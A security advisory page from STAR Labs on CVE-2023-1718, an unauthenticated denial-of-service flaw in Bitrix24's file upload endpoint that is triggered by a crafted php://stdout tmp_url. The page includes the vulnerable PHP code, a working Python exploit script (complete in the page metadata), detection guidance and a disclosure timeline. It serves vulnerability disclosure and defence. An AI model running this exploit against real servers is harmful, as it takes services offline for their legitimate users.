<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1718   CVE Description Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted &ldquo;tmp_url&rdquo;.   CWE Classification(s) CWE-835 Loop with Unreachable Exit Condition (&lsquo;Infinite Loop&rsquo;)   CAPEC Classification(s) CAPEC-545 Pull Data from System Resources    CVSS3.">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1718/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access" />
<meta property="og:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1718   CVE Description Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted &ldquo;tmp_url&rdquo;.   CWE Classification(s) CWE-835 Loop with Unreachable Exit Condition (&lsquo;Infinite Loop&rsquo;)   CAPEC Classification(s) CAPEC-545 Pull Data from System Resources    CVSS3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1718/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access"/>
<meta name="twitter:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1718   CVE Description Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted &ldquo;tmp_url&rdquo;.   CWE Classification(s) CWE-835 Loop with Unreachable Exit Condition (&lsquo;Infinite Loop&rsquo;)   CAPEC Classification(s) CAPEC-545 Pull Data from System Resources    CVSS3."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access",
      "item": "https://starlabs.sg/advisories/23/23-1718/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access",
  "name": "(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access",
  "description": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1718   CVE Description Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted \u0026ldquo;tmp_url\u0026rdquo;.   CWE Classification(s) CWE-835 Loop with Unreachable Exit Condition (\u0026lsquo;Infinite Loop\u0026rsquo;)   CAPEC Classification(s) CAPEC-545 Pull Data from System Resources    CVSS3.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1718   CVE Description Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted “tmp_url”.   CWE Classification(s) CWE-835 Loop with Unreachable Exit Condition (‘Infinite Loop’)   CAPEC Classification(s) CAPEC-545 Pull Data from System Resources    CVSS3.1 Scoring System: Base Score: 7.5 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) None   Integrity (I) None   Availability (A) High    Vulnerability Details: This report presents information on a Denial of Service (DoS) vulnerability that allows an attacker cause the affected webserver to be unresponsive due to excessive computing resource consumption.\nUnauthenticated users may use the file upload functionality provided by the /desktop_app/file.ajax.php?action=uploadfile. In addition to files uploaded within the request, files can also be specified by their URL. These files will then by downloaded and saved. This URL is specified in the tmp_url field of the supplied file object.\nThe checkFile function is eventually called on the file object:\n// bitrix/modules/main/lib/ui/uploader/file.php line 590  public static function checkFile(\u0026$file, File $f, $params) { $result = new Result(); if ($file[\"error\"]  0) $result-addError(new Error(File::getUploadErrorMessage($file[\"error\"]), \"BXU347.2.9\".$file[\"error\"])); else if (array_key_exists(\"tmp_url\", $file)) { $url = new Uri($file[\"tmp_url\"]); // [1]  if ($url-getHost() == '' \u0026\u0026 ($tmp = \\CFile::MakeFileArray($url-getPath())) \u0026\u0026 // [2]  is_array($tmp)) { $file = array_merge($tmp, $file); } // ...  } // ... } In [1], the URL supplied in tmp_url is parsed. The path of the URL is then passed to CFile::MakeFileArray in [2].\n// bitrix/modules/main/classes/general/file.php line 1734  public static function MakeFileArray($path, $mimetype = false, $skipInternal = false, $external_id = \"\") { $io = CBXVirtualIo::GetInstance(); $arFile = array(); if(intval($path)0) { // ...  } $path = preg_replace(\"#(?\\\\\\\\\\\\/]+#\", \"/\", $path); if($path == '' || $path == \"/\") { return NULL; } if(preg_match(\"#^(php://filter|phar://)#i\", $path)) { return NULL; } if(preg_match(\"#^(http[s]?)://#\", $path)) { // ...  } elseif(preg_match(\"#^(ftp[s]?|php)://#\", $path)) // [3]  { if($fp = fopen($path,\"rb\")) { $content = \"\"; while(!feof($fp)) // [4]  { $content .= fgets($fp, 4096); } if($content  '') { // ...  } fclose($fp); } } else { // ...  } // .. } If the path starts with ftp://, ftps:// or php://, control flow enters the branch at [3]. The file is then opened with fopen, and its contents are read in chunks of 4096 bytes until the EOF marker is reached ([4]).\nHowever, if an attacker specifies the PHP stream php://stdout, the EOF marker will never be reached as the stream is a write-only stream. Therefore, the program will enter an infinite loop as !feof($fp) will always be true.\nThis will result in the process handling the request consuming as much compute time as it is allowed, preventing the handling of other legitimate requests.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that results in Denial of Service via resource exhaustion on the target server.\nA sample exploit script is shown below:\n# Bitrix24 Improper File Stream Access DoS (CVE-2023-XXXXX) # Via: https://TARGET_HOST/desktop_app/file.ajax.php?action=uploadfile # Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import random import requests import re HOST = \"http://localhost:8000\" SITE_ID = \"s1\" PROXY = {\"http\": \"http://localhost:8080\"} def preauth(s): res = s.get(HOST) return re.search(re.compile(\"'bitrix_sessid':'([a-f0-9]{32})'\"), res.text).group( 1 ) def DoS(session, sessid): CID = random.randint(0, pow(10, 5)) session.post( HOST + \"/desktop_app/file.ajax.php?action=uploadfile\", headers={ \"X-Bitrix-Csrf-Token\": sessid, \"X-Bitrix-Site-Id\": SITE_ID, }, data={ \"bxu_info[mode]\": \"upload\", \"bxu_info[CID]\": str(CID), \"bxu_info[filesCount]\": \"1\", \"bxu_info[packageIndex]\": f\"pIndex{CID}\", \"bxu_info[NAME]\": f\"file{CID}\", \"bxu_files[0][name]\": f\"file{CID}\", \"bxu_files[0][files][default][tmp_url]\": f\"a:php://stdout\", \"bxu_files[0][files][default][tmp_name]\": f\"file{CID}\", }, proxies=PROXY, ) if __name__ == \"__main__\": s = requests.Session() s.proxies = PROXY sessid = preauth(s) print(\"[+] Launching DoS...\") DoS(s, sessid) Exploit Conditions: This vulnerability can be exploited by unauthenticated users.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of php://stdout or file:///dev/stdout in request bodies.\nCredits Lam Jun Rong \u0026 Li Jiantao of of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "995",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1718/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1718</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Improper file stream access in /desktop_app/file.ajax.php?action=uploadfile in Bitrix24 22.0.300 allows unauthenticated remote attackers to cause denial-of-service via a crafted &ldquo;tmp_url&rdquo;.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-835 Loop with Unreachable Exit Condition (&lsquo;Infinite Loop&rsquo;)</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-545 Pull Data from System Resources</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 7.5 (High)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>This report presents information on a Denial of Service (DoS) vulnerability that allows an attacker cause the affected webserver to be unresponsive due to excessive computing resource consumption.</p>
<p>Unauthenticated users may use the file upload functionality provided by the <code>/desktop_app/file.ajax.php?action=uploadfile</code>. In addition to files uploaded within the request, files can also be specified by their URL. These files will then by downloaded and saved. This URL is specified in the <code>tmp_url</code> field of the supplied file object.</p>
<p>The <code>checkFile</code> function is eventually called on the file object:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/lib/ui/uploader/file.php line 590
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">checkFile</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$file</span><span class="p">,</span> <span class="nx">File</span> <span class="nv">$f</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Result</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">addError</span><span class="p">(</span><span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="nx">File</span><span class="o">::</span><span class="na">getUploadErrorMessage</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]),</span> <span class="s2">&#34;BXU347.2.9&#34;</span><span class="o">.</span><span class="nv">$file</span><span class="p">[</span><span class="s2">&#34;error&#34;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&#34;tmp_url&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uri</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">&#34;tmp_url&#34;</span><span class="p">]);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">getHost</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> 
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">\CFile</span><span class="o">::</span><span class="na">MakeFileArray</span><span class="p">(</span><span class="nv">$url</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">()))</span> <span class="o">&amp;&amp;</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">is_array</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>In <code>[1]</code>, the URL supplied in <code>tmp_url</code> is parsed. The path of the URL is then passed to <code>CFile::MakeFileArray</code> in <code>[2]</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/classes/general/file.php line 1734
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">MakeFileArray</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$mimetype</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$skipInternal</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$external_id</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$io</span> <span class="o">=</span> <span class="nx">CBXVirtualIo</span><span class="o">::</span><span class="na">GetInstance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$arFile</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;#(?&lt;!:)[</span><span class="se">\\\\\\</span><span class="s2">/]+#&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="nv">$path</span> <span class="o">==</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;#^(php://filter|phar://)#i&#34;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;#^(http[s]?)://#&#34;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">elseif</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;#^(ftp[s]?|php)://#&#34;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">))</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$content</span> <span class="o">.=</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$content</span> <span class="o">&lt;&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ..
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>If the path starts with <code>ftp://</code>, <code>ftps://</code> or <code>php://</code>, control flow enters the branch at <code>[3]</code>. The file is then opened with <code>fopen</code>, and its contents are read in chunks of 4096 bytes until the EOF marker is reached (<code>[4]</code>).</p>
<p>However, if an attacker specifies the PHP stream <code>php://stdout</code>, the EOF marker will never be reached as the stream is a write-only stream. Therefore, the program will enter an infinite loop as <code>!feof($fp)</code> will always be true.</p>
<p>This will result in the process handling the request consuming as much compute time as it is allowed, preventing the handling of other legitimate requests.</p>
<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that results in Denial of Service via resource exhaustion on the target server.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Bitrix24 Improper File Stream Access DoS (CVE-2023-XXXXX)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/desktop_app/file.ajax.php?action=uploadfile</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">SITE_ID</span> <span class="o">=</span> <span class="s2">&#34;s1&#34;</span>
</span></span><span class="line"><span class="cl">
